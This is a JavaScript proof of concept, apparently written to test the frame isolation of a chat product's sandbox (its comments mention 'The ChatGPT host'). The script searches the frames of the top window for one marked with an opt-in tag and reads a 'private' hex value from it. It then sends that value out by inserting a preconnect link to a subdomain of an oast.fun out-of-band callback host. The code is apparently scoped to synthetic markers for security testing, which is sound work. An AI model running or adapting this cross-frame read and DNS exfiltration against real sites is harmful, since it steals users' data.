(() => {
  const output = document.getElementById('cg266-owned-script-status');
  if (!output) return;

  const optIn = 'CG270-OWNED-SYNTHETIC-20261120';
  const markerPattern = /^[0-9a-f]{16}$/;
  const started = Date.now();
  const intervalMs = 250;
  const maximumMs = 30000;
  let timer;
  let finished = false;

  function findApprovedMarker() {
    const visited = new Set();
    let marker = null;

    function inspect(win) {
      if (marker !== null || visited.has(win)) return;
      visited.add(win);
      try {
        const doc = win.document;
        if (doc !== document &&
            doc.getElementById('cg270-opt-in')?.textContent?.trim() === optIn) {
          const value = doc.getElementById('cg266-later-private')?.textContent?.trim();
          if (value && markerPattern.test(value)) {
            marker = value;
            return;
          }
        }
        for (let i = 0; i < win.frames.length && marker === null; i++) {
          inspect(win.frames[i]);
        }
      } catch (_) {
        // A different origin is not readable by this sandbox.
      }
    }

    try {
      for (let i = 0; i < top.frames.length && marker === null; i++) {
        inspect(top.frames[i]);
      }
    } catch (_) {
      // The ChatGPT host is not readable by this sandbox.
    }
    return marker;
  }

  function check() {
    if (finished) return;
    const marker = findApprovedMarker();
    if (marker !== null) {
      finished = true;
      clearInterval(timer);
      output.textContent = `SYNTHETIC_MARKER_FOUND:${marker}`;
      const hint = document.createElement('link');
      hint.rel = 'preconnect';
      hint.href = `https://cg270-${marker}.topwralyyfzhdmfckdhvbjshr74jjfmyr.oast.fun/`;
      document.head.append(hint);
      const status = document.createElement('pre');
      status.id = 'cg270-optin-status';
      status.textContent = `HINT_INSERTED:${marker}`;
      document.body.append(status);
    } else if (Date.now() - started >= maximumMs) {
      finished = true;
      clearInterval(timer);
      output.textContent = 'NO_APPROVED_SYNTHETIC_MARKER';
    }
  }

  timer = setInterval(check, intervalMs);
  check();
})();
